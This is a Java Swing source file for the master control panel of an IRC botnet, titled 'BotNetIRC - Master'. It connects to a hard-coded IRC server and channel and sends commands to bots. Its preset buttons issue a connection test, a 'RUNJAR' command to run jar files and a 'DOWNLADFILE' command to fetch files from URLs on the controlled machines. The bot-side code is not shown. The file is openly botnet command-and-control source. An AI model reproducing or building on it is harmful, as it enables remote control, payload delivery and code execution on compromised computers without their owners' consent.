package mastergui;

import botlogic.Bot;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Random;

/**
 * Created by zychp_w10 on 08.05.2017.
 */
public class Gui {
    private static String server = "irc.kubehe.me";
    private static String nick = "masterGui";
    private static String login = "masterGui";
    private static String channel = "#channel";
    private static String log;


    private Bot masterbot;
    private JPanel mainPanel;
    private JTextField commandTextField1;
    private JButton sendButton;
    private JRadioButton connectiontestRadioButton;
    private JRadioButton runJarFileRadioButton;
    private JRadioButton downloadFileFromUrlRadioButton;
    private JRadioButton userCommandRadioButton;
    private JRadioButton encryptionRadioButton;
    private JTextArea logTextArea1;
    private JPanel logPanel;
    private JPanel buttonPanel;
    private JPanel graphpanel;
    private JScrollPane logScrollPane;

    public Gui() throws Exception {
        setNickAndLogin(getRandomNumber());
        masterbot = new Bot(server, nick, login, channel);
        masterbot.connectToIRC();
        logTextArea1.setEditable(false);
        Timer timer = new Timer(1000, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    logTextArea1.append(masterbot.receiveMessage() + "\n");
                } catch (java.lang.Exception exc) {
                }
            }
        });
        timer.start();
        sendButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String command;
                command = commandTextField1.getText();
                commandTextField1.setText(command);
                logTextArea1.append(command + "\n");
                JScrollBar vertical = logScrollPane.getVerticalScrollBar();
                vertical.setValue(vertical.getMaximum());
                try {
                    masterbot.sendMessage(command);
                } catch (java.lang.Exception exc) {
                }
            }
        });
        connectiontestRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("TESTINOUT");
            }
        });
        runJarFileRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("RUNJAR");
            }
        });
        downloadFileFromUrlRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("DOWNLADFILE");
            }
        });
        userCommandRadioButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText(null);
            }
        });
    }

    private static void setNickAndLogin(int randomNumber)
    {
        String number = Integer.toString(randomNumber);
        System.out.println("BOT_NO:" + number);
        nick = nick.concat(number);
        login = login.concat(number);
    }

    private static int getRandomNumber()
    {
        Random randomGenerator = new Random();
        return randomGenerator.nextInt(9999);
    }

    public static void main(String[] args) throws Exception {
        JFrame frame = new JFrame("Gui");
        frame.setSize(600, 400);
        frame.setLocationByPlatform(true);
        frame.setTitle("BotNetIRC - Master");
        frame.setContentPane(new Gui().mainPanel);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);
    }
}
